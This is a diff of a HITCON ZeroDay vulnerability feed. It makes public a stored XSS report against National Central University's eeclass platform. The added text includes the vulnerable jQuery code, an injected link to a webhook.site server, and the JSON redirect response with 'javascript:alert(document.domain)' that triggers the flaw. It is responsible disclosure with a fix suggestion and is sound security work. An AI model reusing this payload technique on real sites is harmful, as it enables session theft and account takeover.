@@ -1949,7 +1949,7 @@
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="411101323236713325" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="2a7a6a59595d1a584e" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -2014,7 +2014,7 @@
     <li>
      通報者：wucy0612 (
      <a href="/user/wucy0612">
-      <span class="__cf_email__" data-cfemail="267666555551165442">
+      <span class="__cf_email__" data-cfemail="1b4b5b68686c2b697f">
        [email protected]
       </span>
      </a>
@@ -6192,7 +6192,7 @@
   </div>
  </section>
 </div>
-</description><pubDate>Sun, 27 Mar 2022 00:32:51 GMT</pubDate></item><item><title> 某單位  XSS</title><link>https://zeroday.hitcon.org/vulnerability/ZD-2022-00229</link><description><div class="container">
+</description><pubDate>Sun, 27 Mar 2022 00:32:51 GMT</pubDate></item><item><title>中央大學 eeclass XSS</title><link>https://zeroday.hitcon.org/vulnerability/ZD-2022-00229</link><description><div class="container">
  <h2 class="always-not-there">
   Vulnerability Detail Report
  </h2>
@@ -6210,12 +6210,25 @@
       ZD-2022-00229
      </span>
     </li>
+    <li class="vendor">
+     <a class="zdui-button send-message okgo" href="/up/message/channel/create/vendor/77">
+      <i class="far fa-envelope">
+      </i>
+      發信
+     </a>
+     <span class="label">
+      Vendor:
+     </span>
+     <span class="value tx-overflow-ellipsis">
+      國立中央大學
+     </span>
+    </li>
     <li class="title">
      <span class="label">
       Title:
      </span>
      <span class="value">
-      某單位  XSS
+      中央大學 eeclass XSS
      </span>
     </li>
     <li class="intro">
@@ -6238,10 +6251,10 @@
     目前狀態
    </h4>
    <div class="status-label col-status-200-tx">
-    確認已修補
+    公開
    </div>
    <div class="status-descr">
-    Last Update : 2022/04/08
+    Last Update : 2022/04/12
    </div>
    <ul class="zdui-status-timeline stat-tn-risk-medium">
     <li class="">
@@ -6280,7 +6293,7 @@
       </span>
      </div>
     </li>
-    <li class="just-arrived">
+    <li class="">
      <div class="stat-tn-node">
       <span class="stat-tn-date">
       </span>
@@ -6289,7 +6302,7 @@
       </span>
      </div>
     </li>
-    <li class="not-arrived-yet">
+    <li class="just-arrived">
      <div class="stat-tn-node">
       <span class="stat-tn-date">
       </span>
@@ -6371,6 +6384,17 @@
       確認已修補 (由 maple3142 更新此狀態)
      </span>
     </li>
+    <li>
+     <span class="log-date">
+      2022/04/12 03:00:15
+     </span>
+     <span class="always-not-there">
+      :
+     </span>
+     <span class="log-status">
+      公開 (由 HITCON ZeroDay 平台自動更新)
+     </span>
+    </li>
    </ul>
   </div>
  </section>
@@ -6399,6 +6423,151 @@
    </ul>
   </div>
  </section>
+ <section class="vul-detail-section vu-d-url">
+  <h3 class="sec-title">
+   參考資料
+  </h3>
+  <div class="section-content url">
+   <div>
+    攻擊者可經由該漏洞竊取使用者身份，或進行掛碼、轉址等攻擊行為。
+    <br/>
+    <br/>
+    漏洞說明： OWASP - Cross-site Scripting (XSS)
+    <br/>
+    https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
+    <br/>
+    <br/>
+    防護原則：
+    <br/>
+    https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet
+    <br/>
+    <br/>
+    XSS 防禦繞過方式：
+    <br/>
+    https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
+   </div>
+   <div align="right" class="section-content url" style="color: grey; margin-top: 20px">
+    (本欄位資訊由系統根據漏洞類別自動產生，做為漏洞參考資料。)
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section vu-d-url">
+  <h3 class="sec-title">
+   相關網址
+  </h3>
+  <div class="section-content url">
+   <div class="urls">
+    平台上任意能發表文章的地方都能注入，包括任意課程頁面的討論區，或是對老師或是助教的私密留言等等都可以
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section">
+  <h3 class="sec-title">
+   敘述
+  </h3>
+  <div class="section-content zdui-md-content" id="detail">
+   <div>
+    <p>
+     平台上有許多地方能讓使用者送 html，不過在 server side 都有經過一定的 filter 所以沒辦法直接 XSS。利用的漏洞是
+     <code>
+      bundle.rwd.js
+     </code>
+     中這段的程式碼:
+    </p>
+    <pre><code>    $('.js-fs-ajax').click(function(e) {
+        e.preventDefault();
+        var that = $(this);
+        if (that.hasClass('disabled') || that.closest('.disabled').length) {
+            return false;
+        }
+        $.post(that.data('url') || this.href || that.attr('href'), function(o) {
+            if (o.ret.status !== 'true') {
+                alert(o.ret.msg);
+                return;
+            }
+            if (o.ret.alert) {
+                alert(o.ret.alert);
+            }
+            if (o.ret.redirect) {
+                window.location.href = o.ret.redirect;
+                return;
+            }
+            window.location.reload();
+        }, 'json');
+    });</code></pre>
+    <p>
+     只要注入一個如下方的 html 進去，其中
+     <code>
+      href
+     </code>
+     指向攻擊者的伺服器
+    </p>
+    <pre><code>&lt;a class="js-fs-ajax" href="https://webhook.site/62cc2e32-cce1-49de-9528-a11a4476d9e5"&gt;peko&lt;/a&gt;</code></pre>
+    <p>
+     這樣頁面載入後也在連攻擊者所注入的這個元素上 listen click event，然後受害者點擊之後它就會向攻擊者的伺服器發送請求，然後將取回的資料的
+     <code>
+      ret.redirect
+     </code>
+     部分直接塞到
+     <code>
+      location.href
+     </code>
+     中。如果該 url 是
+     <code>
+      javascript:alert(1)
+     </code>
+     之類的 url 就能達成 XSS。
+    </p>
+    <p>
+     攻擊者的伺服器需要返回以下的 response 才能成功攻擊:
+    </p>
+    <pre><code>{
+  "ret": {
+    "status": "true",
+    "redirect": "javascript:alert(document.domain)"
+  }
+}</code></pre>
+    <p>
+     header 要有
+     <code>
+      Content-Type: application/json
+     </code>
+     <code>
+      Access-Control-Allow-Origin: *
+     </code>
+     和
+     <code>
+      Access-Control-Allow-Methods: *
+     </code>
+     。
+    </p>
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section">
+  <h3 class="sec-title">
+   修補建議
+  </h3>
+  <div class="section-content zdui-md-content">
+   <p>
+    建議將 user submitted html 中所有元素的 class 和 id attribute 都移除
+   </p>
+  </div>
+ </section>
+ <section class="vul-detail-section">
+  <h3 class="sec-title">
+   擷圖
+  </h3>
+  <div class="section-content screenshot">
+   <ul>
+    <li>
+     <span>
+      <img src="/api/vulnerability/7392/attachments/ac5b39e42cc8c014f39bf2456b08968d" width="320"/>
+     </span>
+    </li>
+   </ul>
+  </div>
+ </section>
  <section class="vul-detail-section vu-d-cmnt">
   <h3 class="sec-title">
    留言討論
@@ -6411,6 +6580,25 @@
      <a href="/auth/login">
       登入後留言
      </a>
+    </div>
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section vu-d-cmnt">
+  <h3 class="sec-title">
+   聯絡組織
+  </h3>
+  <div class="section-content">
+   <div class="zdui-comment-block">
+    <div class="input-comment">
+     <a class="zdui-button okgo" href="/up/message/channel/create/vendor/77">
+      <i class="far fa-envelope">
+      </i>
+      發送私人訊息
+     </a>
+     <div class="remind-text">
+      您也可以透過私人訊息的方式與組織聯繫，討論有關於這個漏洞的相關資訊。
+     </div>
     </div>
    </div>
   </div>
@@ -9923,7 +10111,7 @@
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="91c1d1e2e2e6a1e3f5" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="015141727276317365" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -9988,7 +10176,7 @@
     <li>
      通報者：wucy0612 (
      <a href="/user/wucy0612">
-      <span class="__cf_email__" data-cfemail="401000333337703224">
+      <span class="__cf_email__" data-cfemail="dc8c9cafafabecaeb8">
        [email protected]
       </span>
      </a>
